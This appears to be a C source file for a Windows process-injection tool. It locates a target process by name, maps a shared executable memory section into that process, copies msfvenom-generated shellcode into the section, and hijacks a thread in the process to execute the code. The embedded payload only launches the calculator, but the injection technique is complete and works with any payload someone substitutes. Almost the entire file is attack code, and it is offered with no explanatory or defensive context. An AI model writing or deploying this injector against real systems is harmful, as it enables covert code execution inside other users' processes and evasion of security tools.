#include <stdio.h>
#include <windows.h>
#include <tlhelp32.h>
#include "globals.h"

// Needed for compiling
#pragma comment (lib, "OneCore.lib")

HANDLE pThreadHandle = NULL; // Global var for a handle to the thread
DWORD processId = 0; // Global var for the PID of the provided process name. 
DWORD pThreadId = 0; // Global var for an ID to the thread
PVOID pAddress = NULL; // Global var for the address of the shellcode in memory.

// Calc shellcode. From msfvenom
unsigned char shellcode[] = {
	0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00, 0x00, 0x00, 0x41, 0x51,
	0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xD2, 0x65, 0x48, 0x8B, 0x52,
	0x60, 0x48, 0x8B, 0x52, 0x18, 0x48, 0x8B, 0x52, 0x20, 0x48, 0x8B, 0x72,
	0x50, 0x48, 0x0F, 0xB7, 0x4A, 0x4A, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
	0xAC, 0x3C, 0x61, 0x7C, 0x02, 0x2C, 0x20, 0x41, 0xC1, 0xC9, 0x0D, 0x41,
	0x01, 0xC1, 0xE2, 0xED, 0x52, 0x41, 0x51, 0x48, 0x8B, 0x52, 0x20, 0x8B,
	0x42, 0x3C, 0x48, 0x01, 0xD0, 0x8B, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48,
	0x85, 0xC0, 0x74, 0x67, 0x48, 0x01, 0xD0, 0x50, 0x8B, 0x48, 0x18, 0x44,
	0x8B, 0x40, 0x20, 0x49, 0x01, 0xD0, 0xE3, 0x56, 0x48, 0xFF, 0xC9, 0x41,
	0x8B, 0x34, 0x88, 0x48, 0x01, 0xD6, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
	0xAC, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0x38, 0xE0, 0x75, 0xF1,
	0x4C, 0x03, 0x4C, 0x24, 0x08, 0x45, 0x39, 0xD1, 0x75, 0xD8, 0x58, 0x44,
	0x8B, 0x40, 0x24, 0x49, 0x01, 0xD0, 0x66, 0x41, 0x8B, 0x0C, 0x48, 0x44,
	0x8B, 0x40, 0x1C, 0x49, 0x01, 0xD0, 0x41, 0x8B, 0x04, 0x88, 0x48, 0x01,
	0xD0, 0x41, 0x58, 0x41, 0x58, 0x5E, 0x59, 0x5A, 0x41, 0x58, 0x41, 0x59,
	0x41, 0x5A, 0x48, 0x83, 0xEC, 0x20, 0x41, 0x52, 0xFF, 0xE0, 0x58, 0x41,
	0x59, 0x5A, 0x48, 0x8B, 0x12, 0xE9, 0x57, 0xFF, 0xFF, 0xFF, 0x5D, 0x48,
	0xBA, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x8D,
	0x01, 0x01, 0x00, 0x00, 0x41, 0xBA, 0x31, 0x8B, 0x6F, 0x87, 0xFF, 0xD5,
	0xBB, 0xE0, 0x1D, 0x2A, 0x0A, 0x41, 0xBA, 0xA6, 0x95, 0xBD, 0x9D, 0xFF,
	0xD5, 0x48, 0x83, 0xC4, 0x28, 0x3C, 0x06, 0x7C, 0x0A, 0x80, 0xFB, 0xE0,
	0x75, 0x05, 0xBB, 0x47, 0x13, 0x72, 0x6F, 0x6A, 0x00, 0x59, 0x41, 0x89,
	0xDA, 0xFF, 0xD5, 0x63, 0x61, 0x6C, 0x63, 0x00
};

BOOL getRemoteProcessHandle(IN LPWSTR processName, OUT DWORD* dwProcessId, OUT HANDLE* hProcessHandle) {
	
	HANDLE hSnapshot = NULL;
	PROCESSENTRY32 pe32 = { 0 };

	// Convert the provided processName to lowercase.
	WCHAR lowercaseProcessName[MAX_PATH] = { 0 };
	RtlSecureZeroMemory(lowercaseProcessName, MAX_PATH);
	DWORD processNameLength = lstrlenW(processName);
	for (DWORD i = 0; i < processNameLength; i++) {
		lowercaseProcessName[i] = (WCHAR)towlower(processName[i]);
	}

	lowercaseProcessName[processNameLength] = '\0';

	// Take a snapshot of all running processes
	hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hSnapshot == INVALID_HANDLE_VALUE) {
		printf("(-) hSnapshot failed. Error: %d", GetLastError());
		return FALSE;
	}

	pe32.dwSize = sizeof(PROCESSENTRY32);

	if (!Process32First(hSnapshot, &pe32)) {
		printf("(-) Enumeration of snapshot failed. Error: %d", GetLastError());
		CloseHandle(hSnapshot);
		return FALSE;
	}

	// Converting the process name to lowercase & then comparing it to the provided CLI argument
	do {
		WCHAR lowerName[MAX_PATH] = { 0 };

		if (pe32.szExeFile) { 

			DWORD dwProcessLength = lstrlenW(pe32.szExeFile);
			
			RtlSecureZeroMemory(lowerName, MAX_PATH * 2);

			if (dwProcessLength < MAX_PATH) {
				DWORD i = 0;
				for (i = 0; i < dwProcessLength; i++)
					lowerName[i] = (WCHAR)tolower(pe32.szExeFile[i]);
				
				lowerName[dwProcessLength] = '\0';
			}
		}

		// Compare the two names
		if (wcscmp(lowerName, lowercaseProcessName) == 0) {
			wprintf(L"\t(+) Process Found!\n");
			*dwProcessId = pe32.th32ProcessID;
			*hProcessHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, *dwProcessId);
			CloseHandle(hSnapshot);
			return (*hProcessHandle != NULL);
		}
	} while (Process32Next(hSnapshot, &pe32));

	CloseHandle(hSnapshot);
	return FALSE;
}


BOOL remoteMapInject(IN HANDLE processHandle, IN PBYTE sShellcode, IN DWORD sSizeOfShellcode, OUT PVOID* ppAddress) {

	HANDLE hFile = NULL;
	PVOID mapLocalAddress = NULL;
	PVOID mapRemoteAddress = NULL;

	hFile = CreateFileMapping(INVALID_HANDLE_VALUE, NULL, PAGE_EXECUTE_READWRITE, 0, sSizeOfShellcode, NULL);
	if (hFile == NULL) {
		wprintf(L"(-) Create File Mapping failed. Error: %d", GetLastError());
		return FALSE;
	}

	mapLocalAddress = MapViewOfFile(hFile, FILE_MAP_WRITE, 0, 0, sSizeOfShellcode);
	if (mapLocalAddress == NULL) {
		wprintf(L"(-) Map Local Address failed. Error: %d", GetLastError());
		CloseHandle(hFile);
		return FALSE;
	}

	wprintf(L"(+) Local Mapping address located at 0x%p\n", mapLocalAddress);
	wprintf(L"(+) Hit <Enter> to write the payload");
	(void)getchar();

	memcpy(mapLocalAddress, sShellcode, sSizeOfShellcode);
	wprintf(L"\t(+) Payload copied to local memory\n");

	mapRemoteAddress = MapViewOfFile2(hFile, processHandle, 0, NULL, 0, 0, PAGE_EXECUTE_READWRITE);
	if (mapRemoteAddress == NULL) {
		wprintf(L"(-) Map Remote Address failed. Error: %d\n", GetLastError());
		CloseHandle(hFile);
		return FALSE;
	}
	wprintf(L"\t(+) Remote Mapping Address located at 0x%p\n", mapRemoteAddress);

	*ppAddress = mapRemoteAddress;

	return TRUE;
}


int wmain(int argc, wchar_t* argv[]) {

	HANDLE givenProcessHandle = NULL;

	// Argument check
	if (argc != 2) {
		wprintf(L"\n(-) Correct Usage: %s <processName.ext>\n", argv[0]);
		return -1;
	}
	wprintf(L"\n(+) Searching for process \"%s\"\n", argv[1]);

	// Obtain a handle to the provided process
	if (!getRemoteProcessHandle(argv[1], &processId, &givenProcessHandle)) {
		printf("(-) GetRemoteProcessHandle failed. Error: %d", GetLastError());
		return -1;
	}
	wprintf(L"\t(+) Remote process handle obtained for PID %d\n", processId);

	// Inject the shellcode into memory using Remote Mapping Injection
	if (!remoteMapInject(givenProcessHandle, shellcode, sizeof(shellcode), &pAddress)) {
		wprintf(L"(-) Remote Map Inject failed. Error: %d", GetLastError());
		CloseHandle(givenProcessHandle);
		return -1;
	}

	// Enumerate processes threads & obtain a handle to target thread 
	if (!getRemoteThreadHandle(processId, &pThreadId, &pThreadHandle)) {
		wprintf(L"(-) Get Remote Thread Handle failed. Error: %d", GetLastError());
		CloseHandle(givenProcessHandle);
		return -1;
	}
	wprintf(L"(+) Remote thread ID: %lu\n", pThreadId);

	// Hijack thread running in remote process. 
	if (!hijackThread(pThreadHandle, pAddress)) {
		wprintf(L"(-) Hijacking thread failed. Error: %d", GetLastError());
		return -1;
	}

	// Cleanup
	CloseHandle(pThreadHandle);
	CloseHandle(givenProcessHandle);
	return 0;
}